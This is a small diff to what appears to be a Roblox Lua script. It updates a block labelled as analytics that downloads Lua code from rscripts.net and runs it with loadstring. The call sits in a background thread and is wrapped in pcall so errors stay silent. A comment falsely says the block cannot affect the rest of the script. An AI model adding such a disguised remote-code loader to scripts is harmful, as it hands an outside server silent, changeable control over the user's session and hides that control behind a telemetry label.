@@ -3,7 +3,7 @@
 -- Runs in its own thread and cannot affect the script below.
 task.spawn(function()
 	pcall(function()
-		loadstring(game:HttpGet("https://rscripts.net/api/telemetry/v2/client.lua?s=6aa345429b4dbc326305d260"))()
+		loadstring(game:HttpGet("https://rscripts.net/api/telemetry/v2/client.lua?s=6a7b8c54b2c67c5146622fa6"))()
 	end)
 end)
 --[[rscripts:analytics:end]]
